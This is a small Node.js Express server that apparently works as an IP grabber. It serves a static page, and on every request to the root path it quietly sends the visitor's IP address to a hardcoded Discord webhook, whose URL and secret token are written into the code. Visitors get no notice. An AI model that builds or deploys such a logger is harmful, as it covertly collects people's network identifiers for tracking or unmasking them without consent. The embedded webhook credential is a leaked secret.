const express = require('express');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1226857197266665504/M5HJek8gGpJDsnsxxpQWD5D7ZhE-SGrZXlM9zBDZV7DB7ArFvLzIRUP9Q25U9hr3G7Au';

app.use(express.static('public'));

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: `New visitor IP: ${ip}` })
  }).catch(err => console.error('Webhook error:', err));

  res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
